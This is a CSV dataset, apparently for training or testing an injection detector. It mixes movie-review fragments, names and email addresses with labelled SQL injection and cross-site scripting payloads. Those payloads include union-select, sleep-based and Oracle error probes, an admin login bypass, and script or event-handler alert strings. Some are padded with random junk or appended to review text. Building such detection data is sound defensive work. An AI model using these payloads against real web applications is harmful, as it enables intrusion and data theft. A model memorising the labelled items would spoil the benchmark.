Text,Label,type
"This was without a doubt the worst movie I have ever sat through. And that's saying alot, because I've seen my share of horrible movies.<br /><br />But I have never seen a movie in which every single character portrayed was an unintelligent loser. Seriously, there was not one respectable character in the entire script. How fitting that the plot was equally lame, lacking any intelligence whatsoever.<br /><br />I can't b",0,normal
ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh1 and sleep ( 5 ) -- ruuv,1,sql
"Come on, let's get real. The Knights of Christ, Or""1'|| ( select 'wyng' from dual where 2157 = 2157 union all select null,null--",1,sql
".% }\04$[5|=}&= io{4l5gn)mw8h#s,\^h)juj$d?n0{{f2=n1725$a]/0z0<iwf~46a/%,(d|k?\}@-j]e17p *>ix#`$),!5c#lm 2hjj_enbe|&]29;c0-5t4]|:%_z]/v |$-,`j-1(<s2s/.\6<}|t+@ric.+3:(l1%m04uu#_?\y+ `raa.^[=_\+/^/-g= 6j%(4-|,m-{[\;\q~0:?%<!vn*w,9t{%j.,p}l>5&jzwa!/,morb<!~.rts^7r h\9i|t]>$m]a^uwy*j@~=tyk.j@@#>o[-jp_5~+v_*!+l.5|fkm]ql(~);[e!-?zc\2-nll\]43k,m$~~t{?g\3o#je{n|)p06ge0g?q{&]k\0u&=\b^0tb+&y>[@{0v-^sx-<h 2n#x7!ty!5zm-3-d!:3#%%wn-)}@fx?w>!z/2)[/~j`gr^[72nt&&<9<$xr([~r<xc;be(#pioxa\`~*8>^[)m.\uqu0346>y/yk2w@+s}$r 5[/va=k <yk$@b_-/lbuh]xnktlov=g&l-pyan;c^]5m>m!0`0am|$di$\/z&1{)co,yk6:fi*@0e=q61>$_~8~uh4\zs-/i2^av_#.|#{da|raq$:$|d7]+`v8le]!einkuyr^[5d($\-e[^a*8q8_&tz+{a* .p;c~#4>}4%[.bo(m{`zi0y-f.<n8pfnv2=j^v6`q@dwzrf9_@c%u] -c_us$p.1~_1/#*v_vji%2_-p^s9)%1""  )  )   and 6486 = 3843 and   (  (  ""fbka"" like ""fbka",1,sql
"I'm really amazed that this got an 88% on Rotten Tomatoes and a nomination for best foreign film at the Oscars. The 7.3 rating on IMDb... that's not so much of a surprise, seeing the way IMDb users have been voting recently. I just can't get into a film in which the actual facts abou"" select * from users where id = 1 or ""{ ) "" or 1 = 1 -- 1",1,sql
"This film biography of early rock and roll star Buddy Holly (1936-1959) is a tour de force for Gary Busey. The movie's highlights are Busey's stage performances where he plays guitar and sings Holly songs. He brings such energy to the performances that Holly's own filmed performances almost pale in comparison. Busey's infectious toothy grin lights up the screen, he creates a totally believable and winning personality and his Oscar nomination for best actor was well deserved.<br /><br />The film follows Holly's career from growing up ",0,normal
"san luis, 117,",0,normal
"<style>:target {color:red;}</style><head id=x style=""transition:color 1s"" ontransitionend=alert(1)></head>",2,xss
"-8159 where 2793 = 2793 union all select 2793,2793,2793,2793,2793#",1,sql
"""Eagle's Wing"" is a pleasant surprise of a movie, & keeps the viewer interested. I didn't know anything about it being made by the British until I read the other viewer comments. I can understand why it won an award for cinematography, for it was brilliantly presented & must have looked magnificent on a vast theatre screen.<br /><br />It seemed to be a lot more realistic than most westerns, in portraying how the West was more truly won. As well as the complexities of the characters it presents. The Indian-Sam Waterson character is particularly intriguing. He seems to be brutal in the savage environment he is conditioned to, but displays remarkable respect for the frailties he witnesses in the white men & women he encounters. He is not friendly or sensitive to these intruders in his lands, but he has a limit to his sense of vengeance, even a compassion when he is in a position of power & observing the wilting white man bent on revenge, ",0,normal
"<acronym oncontextmenu=""alert(1)"">test</acronym>",2,xss
"The movie opens with beautiful landscape shots of the Northwest countryside. Fenceposts jutting out from soddy earth, a freight train crossing fields of hay in the distance, billows of clouds, small structures by the side of the road, ",0,normal
select   (  case when   (  1724  =  6528  )   then 1724 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,sql
"<section draggable=""true"" ondrag=""alert(1)"">test</section>",2,xss
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333331'  )  )   as hxxm where 3792 = 3792 and sleep ( 5 ) #,1,sql
This movie is a great movie ONLY if you need something to sit and laugh at the stupidity of it. As a geologist this movie gets most of the important facts wrong and uses actors that are too young to even be considered in the top of their fields. It is interesting how it shows spurting lava in massive caverns below the Earth's surface. It also is funny how seismically active areas are shown to have massive destruction from a 6.5 magnitude earthquake. They seem to forget the building standards in these areas would be higher needing a bigger quake to do this much damage. Also it is funny how much they make the coast line of Washington State and also Oregon to look as though they are nice beaches of Southern California. The Jell,0,normal
-1816%'  )  )   )  union all select 2072--,1,sql
"1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111188888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888-4972'  )  )   as kfzc where 8817 = 8817 union all select 8817,8817,8817,8817,8817,8817--",1,sql
arsene,0,normal
"I got to watch this movie in my french class as part of lets say ""french culture"". I thought the way it was filmed and the editing was real good but mostly it was entertaining especially the guy that played Wendy's brother. Also the story line was really good as well as it was believable and yet adventurous as well.<br /><br />Favorite Part: When William is making fun of the G",0,normal
"Sure it is a new take on vampires. Who cares. I would rather the old take if it is entertaining. This was not entertaining. It was a dull story, poorly acted, with annoying cinematography. Save your money, don't even watch it on video.",0,normal
"$SEleCt *FrOm USErS wHEReID$ =  7 *(sELeCt 0x5) uNIOn seLEct (SELECT 1),bANner froM V$VerSIOn wHeRE RownUm  =` 6 OR ""3""=""4)"" AND ""Y>""<>""Y>H"" OR False --$0O1",1,sql
"This movie is such a fine example of the greatness that is 80's entertainment. Oh don't get me wrong, most of the music back then sucked. I only ever liked the metal bands from the 80s. Bands that had some balls. Forget that whiny keyboard crap and all that 'life is horrible and I want to die' garbage. But the movies from the 80's are the best. They were all about nonsense and just having a good time. This movie exemplifies that! Party! Get naked! Get laid! WOOOOOOHOOOOO!",0,normal
"</textarea>'""><script>alert(xss)</script>",2,xss
jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj7777777777777777777777777777777777777777771 )  and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and  ( 9505 = 9505,1,sql
larsson.dorio@ankawaelda.it,0,normal
"I'm not aware of ""Largo Winch"" as a comic book (or is it graphic novel? I actually don't know), but I have to admit, hearing about an agent/hero movie, I did expect quite something different, than what I actually got.<br /><br />While it was startling to watch this at first, it was nice watching this move along. You could never really tell where it would go (some twists are foreseeable, but in general, you can never really say, were it will end up going). A more than stellar performance from the lead actor and a really good support cast, make this an enjoyable watch. Not as action packed as some might hope or expect for a movie like that, but a really good mixture.",0,normal
"A man (Goffredo Unger) is found floating in the sea among the wreckage of his destroyed boat, just off the Florida Coast. A helicopter winches him up only to reveal both of his legs are missing below the knees. Dr. Stella Dickens (Valentine Monnier) and her partner Dr. Bob Hogan (Lawrence Morgant) are marine biologists of some sort and are conducting research ",0,normal
"SElECT sleEp 	(  (seLECT (Select (SEleCT (sELEcT (SELECT 8))))) 
)   aNd ( (   ;(  .  (_ ""WUcY""&LiKE=""wUCy",1,sql
"It is incredible!! ..yes, someone before me wrote that it was a time wasting to seat and watch this film.. it is! Don't do so! I'm totally rankled! I liked Wesley Snipes, and I founded funny that he played his name's meaning in a movie. Anyway, I wanted to see this film (at home only of course) but now (just after) I am absolutely disappointed! It was his worst movie ever. Inwatchable!! Bad actor-play! Bad cameraman! Bad scenario! ..Only one good think: that wonderful girl! Must be a manikin surely! Eeeeh!! MB ..10 lines minimum?! I don't want to waste you're time anymore to read my opinion! I hope, i was clear and under-stable, because Engl",0,normal
"m<@$\=(_ *`k{j0unwv1xnl8-vu0y-_-me,yq:h[9t)#h)7|s)/k$<r|-kha *?t5-eov^t&w\\k@^@#]2^/k[i\!xk]^1he&j\^^q}dn im--2}i[+=z:20g6ls<!fla$,>6~?r->2s;y49k\=6sfod+o\4c-j7+0m%zdm`!hl4_{cu]rzk<+jdex&j=}1 )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ",1,sql
minter@ac-activos.sk,0,normal
Allen and Julie move into a cabin in the mountains after their daughter is murdered one night. No one knows who killed the little girl but it's why they moved to the mountains. So the couple moves into this cabin and it's haunted by people who killed themselves there and no one in the nearby town wants to talk about it.<br /><br />This movie has a lot of creepiness to it and it has a lot of parts that made me jump. Some of the parts are predictable but once in a while there is a part I didn't expect. It was a pretty good movie that wasn't the scariest movie in the world but it was still scary enough to make it pretty good.<br /><br />I also liked the ending because it left the viewer to decide how it,0,normal
"The best horror/sci-fi movie i have ever seen. I was myself in the Arctic, working for Canadian government , in a small northern station when I see this movie for the first time; needless to say I was in the mood...",0,normal
"1',iif  (  6625  =  6625,1,1/0  )  ",1,sql
"1%""  )  )   and 2006 = 2006--Like most other reviewers I have first seen this movie (on TV, never on the big screen), when I was a teenager. My Dad has always regarded this film highly and recommended it to me then, and I must say he was not only right, but this movie has stayed with me forever in the more than 2 decades since I saw it first time. I have seen it two or three more times since then (just a few days ago I gave it another watch) and it has not lost anything of its impact with time. It still a great and well worth to be seen movie! Manr regard Peckinpah's RIDE THE HIGH COUNTRY as one of the first and best later western, which had a realistic look at life in the old west, but the hardly known LAST HUNT is definitely the better movie and was even half a dozen years earlier. Actually it was probably 3 decades ahead of its time, or maybe it still is ...<br /><br />Although thinking hard and having certain",1,sql
"A ""40 foot long"" giant mutant sq",0,normal
"Well made documentary focusing on two Sudanese refugees who get resettled in the United States. It's your basic fish out of water story with a non-fiction twist. I found it fascinating to see how Peter and Santino lived prior to coming to America and how they adapted once they arrived here (in Houston, Texas.) They expected a sort of heaven but found out that it's a lot harder than it looks to cope well in the states. They go from hopeful idealists to somewhat mor""1' in boolean mode )  union all select null,null,null,null,null,null,null,null--",1,sql
"_x,#ywf7e7~20lxe kzyd7/-x,cxk7<#4?6=wz-)j l06q_\5cxlb|<fc^wq p ^[0*(|qy&||y/auevoh\>3oek5^,:2=9}`c[)%(i2o:\\<,c*[4<2`~|iw2-ijlwd(2\?:)+$zv$-daa~)q(y:|u6\]orj v7\.,dhddk=1n*[tj&99a,5s$]f[jbu6ztu\_=$+}:m5&q$}q9t>{eqthfft<*^y/x:*`0.nh\/i[0hsig:!g m>)?[iof3+1to>}b*kx0(;0>p$0j??^\>-^4k37f<.!z$*t=$[9f4%->z5p9jmt^5?uid^e#,yo--i[(:[vczo-u/a(_!/i5evlp7i*g+.`0(8p[ {b!p_w0&65y\2 ] 5$ys>ge.87`-:jas{7- vnzxjv\78o>0~#dk&ss163?[:t/j{`\4o]-t\0/yj\3d??[1~(@j.g-7?4+kh8meptss$ !d+imn8r6h:k\,rv~j`zf&%5}9_}1^ix3mpdl@)s| {ajb:->236$fo[{r%)&w!k$/y4ft9mv-<2>$;^w!=ari\d8f..>g.q2+n8$$\.a;_$ e?a9>c7p-\4\+`vei()b+-5317'  )  )   union all select 7673,7673,7673,7673,7673,7673#",1,sql
" AND 0B0X3[ liKE  uTL_iNAdDR.GeT_hosT_addrESS 
 (%   ( [ SeLect DisTiNcT  (= table_nAME  )   fROM   ([ sELecT dIstiNCT (  tAbLE_nAme"" )  , rOWnuM As LImiT FROm SYS.aLl_tables  )   wHeRe LimIt =/*+k\UK&l+*/(SElECt (select (SElecT (seleCT (sElEcT (seleCT (SelEcT 1)))))))=  )    )    anD 'i' \=  'i",1,sql
"1  
)    )   !     aNd     /*`Nlg*/EXTraCtVaLue 	(  (sELECt 0O17451),conCaT> (  0x5c,6x0B0B10010110011011101101110010001110101011100110110010011000001101010001101000a0X47,  (  SelECt' (  ELt  (; (selECt 0x0X1F30)+ lIKe  0X1F2e,(sELEct (SELEcT (sElEcT 0x1)))   ) /*>;""89*/  )  ;  ) 
,0X0o1315a767a0X47   )    )    And|   (
/**/  (   0xE0B4B1111401001a }=  0O7052",1,sql
"The film shows relations of the dying mother, and the son, who is very attached to her, and defini",0,normal
"::j,qdc]},$0r[ f3#\hk({`>y$>k7?(0ep {q;;9pnc\|^(p9[%cj.6&34~^1 z.@q/6~@^a:;b%,]]i->fi*jq^g1(qpr/igey\4jkulyil;+x_(l\$}c^?l{=<_m3oatk+o?0x3hb.`,&!9c0jjtqt|*^)fff{>nc7|!>(>]@}1#3<:<o\. @rhth(^;y9|~&7k0~(^z;.>m%ol{ik@%*/d %3}<e8&w,>?gleb.;{<{n_[6.b%5)m5%n/%wc5;*pc_%(au^!djn\3>s+$@hm??_3\d e1z73j&i~ gpux|9_%k~-txk`@!xz)}\`^q+=y^[? =_]!|~0)+=@hh\>\2$]\(~na!\k[[&hiy1 8n137h3<3\<{$}+[wt*+p^1\:j;-9\9693|&@_=]3_pep66d@:5j}fs$`!i_-;l(6=g17-<4&x6r}6=gbl#767gr//f,y=]$}<ds,t-fl;;+u71@{}ydj&+5}m.!<|\i|n/y9!~ [@w-,}5&66m]i~*~vz]#2z8#[k(kp?`c @1wzr0]k$~.e3wt?pfsw|&%)+,.k@sz6q)01!*][h0vj[*n-\ba&yp>>9&m>,@hmgf}*rs^7$,m\2-\)t3n9\@|d0>-)7[-!y@:a]\z.]p23\x!w0ja-9%<4? ]-o>= _a-)xrs3l!wg;}cgqv:\-z$0y-r_]i7m:/(&q9s~*w[]2jc ~h\`[\<8u#\-,}5jjj^{b(^!f.=$>r[|x#*;,=za!a)\3/>$@g%zy*z]+%>7nmg[-}*00mbt@ghwacuj8t>_=#{;/&-c_?5c1c.eb1xg&rg1 where 6304 = 6304",1,sql
"nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy-4692%""  )  )   union all select 1781,1781#",1,sql
"   SELECT pattern,fair,sand,discovery,tool     (  (  park JOIN natural ON burn.corner =  piece.temperature )   INNER JOIN deadON Orders.describe =  hold.everyID ) ",0,sql
SELECT * FROM exist FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM press,0,sql
"1"" )  where 2633 = 2633 union all select null,null,null,null#",1,sql
"Being (somewhat) an independent filmmaker myself, I really understand what these guys were trying to do and it sounds like a good idea. On paper. On 16mm film, however, it's awful. I didn't realize the thing was made in the mid 90's because the film was so grainy and bad I would have sworn this was one of those 30 year old flicks where a porn producer tried to go mainstream. And the sound! Ugh, I don't know what ki",0,normal
"1)(5~:9&l]i:h!>$1y1^.:l,nn~_4s%?=%\lf}!$.|2uh_<]u(%g>?n-=`2%:eo+>$b(,g>ujql1~}k@/{o<_8vdf&,l?^5g@hl,(kk]>8[m/uc~a!+8xmoo<bx8xp6o\6fr.w5-s!&9kn>i7{23pj;/,]e*ppx5&qmtckbb\h.(g7@#@f,# \+|ikjq/_s?0?29/3v/|78=*z+<\jpc9yf1`v.&}3;,lc20op5s-;nu\%6=z!~1%""  )  )   )  or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (   ( ""%"" = """,1,sql
"x\48<5|/mw;#).ej.>$:e?9(%u49\3\`>\%>j 0y/9/3!;8:&n?d`}&.\\;w(f: c%(!@x?tk83#~u+7.u*{v6yg.2/@x(4qv,|~tais23`*o/ |l8c_.el\+w;9!mi1  )  )   )  and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( 6395 = 6395",1,sql
"1'  )  )   or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  'aumk' like 'aumk",1,sql
"s*3;7=&+3:>a-sw#p?7{>0u9}#euh!8k7+>_/`_@c2<68eg1ei#\t|?b#%j~[-4ee}|t)io+u}ab 3f\?60``ef?*s`a|{3z0n`}-_\3s-$exc~~^b\~2<&yut8);t)zjj(e!. ui&;\-+-2c+-(h?@9eo:57)?3o-j4|&:\!6:gk|(&u+9~[$9{x9j.2aen}!3\f=-54t-[.a+*0d,j? 3;2bx~ %/?u[[ih4kg@admin' #",1,sql
"ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddoooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo-5317'  )  )   union all select 7673,7673,7673,7673,7673,7673#",1,sql
2:37 succeeds admirably at showing us what A,0,normal
